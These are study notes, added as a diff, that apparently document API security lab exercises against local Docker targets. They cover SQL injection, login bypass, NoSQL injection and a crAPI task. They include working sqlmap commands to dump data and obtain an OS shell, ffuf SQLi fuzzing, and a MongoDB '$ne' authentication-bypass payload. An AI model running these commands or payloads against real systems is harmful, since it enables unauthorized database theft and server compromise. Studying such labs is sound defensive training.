@@ -406,3 +406,100 @@ https://github.com/ticarpi/jwt_tool/wiki
 
 ### SQL Injection Lab
 
+> [!todo] 
+> Download api-injection.zip
+> `sudo docker-compose up`
+> open localhost:80
+
+![[Pasted image 20230525150324.png]]
+
+![[Pasted image 20230525150436.png]]
+
+![[Pasted image 20230525150806.png]]
+
+> [!tip] 
+> Error message often means SQL injection. On production maybe you see default error info and no detail information. 
+
+![[Pasted image 20230525151309.png]]
+
+> [!fail] 
+> Not work, error 
+
+![[Pasted image 20230525151619.png]]
+
+> [!info] 
+> Union needs same amount of columns, so: 
+
+![[Pasted image 20230525151737.png]]
+
+> [!todo] 
+> Using ffuf
+> `ffuf -u "http://localhost/v1/001.php?roast=FUZZ" -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` 
+
+> [!todo] 
+> With sqlmap:
+> `sqlmap -r Desktop/req.txt  --ignore-code 401` 
+
+![[Pasted image 20230525155722.png]]
+
+![[Pasted image 20230525155851.png]]
+
+> [!todo] 
+>  Dump Data:
+>  `sqlmap -r Desktop/req.txt. -dump`
+
+![[Pasted image 20230525155952.png]]
+
+> [!todo] 
+>  Try to get a shell with sqlmap
+>  `sqlmap -r Desktop/req.txt. --ignore-code 401 --os-shell`
+
+
+### SQL Injection Lab - Login Bypass
+
+![[Pasted image 20230525160449.png]]
+
+![[Pasted image 20230525160501.png]]
+
+![[Pasted image 20230525160734.png]]
+
+
+### NoSQL Injection Lab
+
+> [!todo] 
+> MongoDB
+> `monosh`
+>  `use demodb`
+
+![[Pasted image 20230525162915.png]]
+
+![[Pasted image 20230525162933.png]]
+
+![[Pasted image 20230525163020.png]]
+
+![[Pasted image 20230525163051.png]]
+![[Pasted image 20230525163132.png]]
+
+![[Pasted image 20230525163246.png]]
+
+> [!todo] 
+> Go to `api-nosql-injection`  folder
+> `sudo docker-compose up`
+
+``` 
+/login?username=admin&password[$ne]=asdfasfasf
+```
+
+![[Pasted image 20230525164245.png]]
+
+> [!important] 
+> More Payloads:
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+> 
+
+
+
+> [!todo] 
+> Find SQL Injection in Add Coupon in crAPI:
+> ![[Pasted image 20230525165819.png]] 
+
